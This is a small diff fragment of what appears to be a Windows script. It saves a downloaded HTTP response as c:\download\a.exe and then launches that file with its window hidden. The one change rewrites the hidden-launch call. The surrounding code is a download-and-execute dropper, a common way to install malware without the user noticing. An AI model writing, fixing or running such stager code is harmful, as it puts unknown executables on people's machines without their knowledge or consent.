@@ -24,7 +24,7 @@
 			ado.Write http.responseBody
 			ado.SaveToFile "c:\download\a.exe"
 			ado.Close
-			WScript.CreateObject("WScript.Shell").Run "c:\download\a.exe",0,true 
+			CreateObject("WScript.Shell").Run "c:\download\a.exe",0,true 
 	
 		]]>
 </script>
